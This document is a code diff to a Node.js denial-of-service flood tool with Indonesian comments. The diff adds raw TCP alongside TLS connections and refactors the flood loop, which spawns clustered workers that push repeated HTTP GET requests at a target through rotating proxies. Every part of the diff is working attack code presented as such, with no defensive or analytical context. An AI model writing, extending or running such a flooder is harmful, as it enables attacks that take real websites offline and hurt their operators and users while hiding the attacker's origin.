@@ -1,6 +1,7 @@
 const cluster = require('cluster');
 const fs = require('fs');
 const tls = require('tls');
+const net = require('net');
 const { URL } = require('url');
 
 if (process.argv.length < 7) {
@@ -48,7 +49,8 @@ if (cluster.isMaster) {
 
     let activeProxy = null; // Menyimpan proxy aktif
 
-    function sendTLSRequest() {
+    // Fungsi untuk mengirim raw data melalui socket atau tls
+    function sendRawOrTLSRequest() {
         let proxy = activeProxy ? activeProxy : getRandomProxy(); // Gunakan proxy aktif jika ada
         const proxyParts = proxy.trim().split(":");
         if (proxyParts.length < 2) return;
@@ -56,34 +58,15 @@ if (cluster.isMaster) {
         const proxyHost = proxyParts[0];
         const proxyPort = parseInt(proxyParts[1], 10);
 
-        const options = {
-            host: proxyHost,
-            port: proxyPort,
-            servername: target.hostname,
-            rejectUnauthorized: false
-        };
+        // Tentukan apakah menggunakan raw TCP atau TLS (SSL)
+        const useTLS = target.protocol === 'https:';
 
-        const client = tls.connect(options, () => {
+        const client = useTLS ? tls.connect(proxyPort, proxyHost, () => {
             activeProxy = proxy; // Tandai proxy yang aktif
-
-            function flood() {
-                if (Date.now() - startTime >= duration * 1000) {
-                    console.log(`Worker ${process.pid} stopping attack.`);
-                    process.exit(0);
-                }
-
-                for (let i = 0; i < rps; i++) {
-                    const request = `GET ${target.pathname} HTTP/1.1\r\n` +
-                                    `Host: ${target.hostname}\r\n` +
-                                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
-                                    "Accept: */*\r\n" +
-                                    "Connection: keep-alive\r\n\r\n";
-                    client.write(request);
-                }
-
-                setTimeout(flood, 50); // Mengatur waktu delay flood menjadi 50ms
-            }
-            flood();
+            startFlood(client);
+        }) : net.connect(proxyPort, proxyHost, () => {
+            activeProxy = proxy; // Tandai proxy yang aktif
+            startFlood(client);
         });
 
         client.on("error", () => {
@@ -91,12 +74,33 @@ if (cluster.isMaster) {
             client.destroy();
             // Jika proxy gagal, pilih proxy baru
             activeProxy = null; // Reset proxy aktif yang gagal
-            sendTLSRequest(); // Coba proxy lain
+            sendRawOrTLSRequest(); // Coba proxy lain
         });
 
         client.on("close", () => {
             client.destroy();
         });
+    }
+
+    // Fungsi untuk memulai flood request
+    function startFlood(client) {
+        function flood() {
+            if (Date.now() - startTime >= duration * 1000) {
+                console.log(`Worker ${process.pid} stopping attack.`);
+                process.exit(0);
+            }
+
+            // Mengirimkan raw data ke target server
+            const request = `GET ${target.pathname} HTTP/1.1\r\n` +
+                            `Host: ${target.hostname}\r\n` +
+                            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
+                            "Accept: */*\r\n" +
+                            "Connection: keep-alive\r\n\r\n";
+            client.write(request);
+
+            setTimeout(flood, 50); // Mengatur waktu delay flood menjadi 50ms
+        }
+        flood();
     }
 
     function attackLoop() {
@@ -106,7 +110,7 @@ if (cluster.isMaster) {
         }
 
         // Kirim permintaan ke target menggunakan proxy acak dari pool atau proxy aktif
-        sendTLSRequest();
+        sendRawOrTLSRequest();
 
         setTimeout(attackLoop, 10); // Delay kecil agar CPU tidak overload
     }
